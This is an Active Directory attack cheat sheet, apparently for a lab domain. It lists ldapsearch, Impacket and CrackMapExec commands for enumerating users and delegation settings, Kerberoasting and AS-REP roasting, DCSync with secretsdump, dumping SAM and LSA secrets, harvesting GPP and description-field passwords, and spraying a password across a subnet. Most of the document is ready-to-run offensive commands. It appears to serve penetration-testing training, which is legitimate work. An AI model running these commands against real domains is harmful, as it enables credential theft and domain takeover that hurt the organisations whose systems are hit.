# LDAP Enumeration Cheat Sheet

## Lab LDAP Info

```
Server  : 192.168.56.10
Port    : 389 (LDAP), 636 (LDAPS), 3268 (GC), 3269 (GC SSL)
Base DN : DC=corp,DC=local
Bind    : corp\attacker.01 / p@ssw0rd
```

---

## ldapsearch (Linux)

```bash
LDAP="ldap://192.168.56.10"
BASE="DC=corp,DC=local"
BIND="corp\\attacker.01"
PASS="p@ssw0rd"

# All users
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" "(objectClass=user)" sAMAccountName

# All enabled users
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" \
  "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  sAMAccountName displayName

# Kerberoastable (SPN set)
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" \
  "(&(objectClass=user)(servicePrincipalName=*)(!samAccountName=krbtgt))" \
  sAMAccountName servicePrincipalName

# AS-REP Roastable (no preauth)
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# All computers
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" "(objectClass=computer)" \
  sAMAccountName operatingSystem dNSHostName

# Unconstrained delegation (computers)
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  sAMAccountName

# Constrained delegation
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" \
  "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo

# All groups
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" "(objectClass=group)" \
  sAMAccountName member

# Domain Admin members
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "CN=Domain Admins,CN=Users,$BASE" \
  "(objectClass=group)" member

# Password policy
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" "(objectClass=domain)" \
  minPwdLength maxPwdAge lockoutThreshold

# Credentials hidden in descriptions
ldapsearch -x -H $LDAP -D "$BIND" -w $PASS -b "$BASE" \
  "(&(objectClass=user)(description=*pass*))" sAMAccountName description
```

---

## Impacket (Linux)

```bash
# Get all AD users
GetADUsers.py -all corp.local/attacker.01:p@ssw0rd -dc-ip 192.168.56.10

# AS-REP Roasting
GetNPUsers.py corp.local/ -usersfile wordlists/lab-users.txt -dc-ip 192.168.56.10 -no-pass

# Kerberoasting
GetUserSPNs.py corp.local/attacker.01:p@ssw0rd -dc-ip 192.168.56.10 -outputfile kerberoast.txt

# DCSync (after getting svc_backup creds)
secretsdump.py corp/svc_backup:p@ssw0rd@192.168.56.10

# Get domain info
ldapdomaindump corp.local/attacker.01:p@ssw0rd -u corp\\attacker.01 --dc-ip 192.168.56.10
```

---

## CrackMapExec

```bash
CME="crackmapexec smb 192.168.56.10 -u attacker.01 -p p@ssw0rd -d corp.local"

# Enumerate users, groups, shares, policies
$CME --users
$CME --groups
$CME --shares
$CME --pass-pol

# Find GPP passwords in SYSVOL
$CME -M gpp_password

# Dump SAM / LSA
$CME --sam
$CME --lsa

# Spray password
crackmapexec smb 192.168.56.0/24 -u wordlists/lab-users.txt -p p@ssw0rd
```

---

## LDAP Filter Reference

| Goal                        | Filter                                                          |
|-----------------------------|----------------------------------------------------------------|
| All users                   | `(objectClass=user)`                                            |
| Disabled users              | `(userAccountControl:1.2.840.113556.1.4.803:=2)`               |
| No pre-auth (AS-REP)        | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`         |
| Password never expires      | `(userAccountControl:1.2.840.113556.1.4.803:=65536)`           |
| Trusted for delegation (unconstrained) | `(userAccountControl:1.2.840.113556.1.4.803:=524288)` |
| Trusted to auth (KCD)       | `(userAccountControl:1.2.840.113556.1.4.803:=16777216)`        |
| Has SPN                     | `(servicePrincipalName=*)`                                      |
| Has RBCD set                | `(msDS-AllowedToActOnBehalfOfOtherIdentity=*)`                  |
| AdminCount = 1              | `(adminCount=1)`                                               |
| All groups                  | `(objectClass=group)`                                          |
| All computers               | `(objectClass=computer)`                                       |
| All OUs                     | `(objectClass=organizationalUnit)`                             |
| All GPOs                    | `(objectClass=groupPolicyContainer)`                           |
